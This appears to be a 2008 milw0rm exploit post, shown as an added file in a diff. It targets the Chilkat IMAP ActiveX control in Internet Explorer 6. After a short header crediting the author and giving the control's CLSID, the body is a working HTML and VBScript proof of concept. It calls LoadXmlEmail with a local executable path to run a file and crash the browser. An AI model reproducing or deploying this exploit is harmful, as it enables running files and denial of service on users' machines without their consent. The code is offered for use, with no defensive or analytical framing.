@@ -1,0 +1,41 @@
+##################Chilkat IMAP ActiveX File Execution&IE DoS ################
+
+www.chilkasoft.com
+
+####By:  e.wiZz!
+####Info: Bosnian Idiot FTW!
+####Site: infected.blogger.ba
+####Greetz: suN8Hclf,Luigi and peoples from hakin9 forum
+
+In the wild...
+
+#####################################################################################
+
+File: ChilkatMail_v7_9.dll
+ProgID: ChilkatMail2.ChilkatMailMan2.1
+CLSID: 126FB030-1E9E-4517-A254-430616582C50
+
+Description:
+
+Function "LoadXmlEmail()" allows us to execute file which leads to DoS in IE.
+
+Tested on IE 6,Win xp sp2
+
+#####################################################################################
+
+<object classid='clsid:126FB030-1E9E-4517-A254-430616582C50' id='inthewild' />
+<script language='vbscript'>
+
+targetFile = "C:\Program Files\Chilkat Software Inc\Chilkat IMAP ActiveX\ChilkatMail_v7_9.dll"
+prototype  = "Function LoadXmlEmail ( ByVal emailFilename As String ) As IChilkatEmail2"
+memberName = "LoadXmlEmail"
+progid     = "CHILKATMAILLib2.ChilkatMailMan2"
+argCount   = 1
+
+arg1="C:\Program Files\mIRC\mirc.exe"
+
+inthewild.LoadXmlEmail arg1 
+
+</script>
+
+# milw0rm.com [2008-09-27]
